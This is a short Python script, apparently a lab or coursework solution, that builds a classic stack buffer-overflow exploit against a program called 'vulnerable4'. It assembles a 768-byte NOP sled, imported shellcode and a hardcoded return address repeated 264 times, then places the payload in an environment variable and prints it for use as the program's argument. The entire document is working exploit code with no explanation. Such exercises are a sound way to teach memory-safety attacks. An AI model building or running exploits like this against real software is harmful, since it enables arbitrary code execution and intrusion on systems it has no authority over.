import os
from shellcode import *
# ./vulnerable4 $(python sol4.py)

#0xbfff7a58
address = '\x58\x7a\xff\xbf'

NOP = '\x90'

buff = (NOP*768 + shellcode + NOP*3 + address*264)

os.environ['evil'] = (buff)

print(os.environ['evil'])
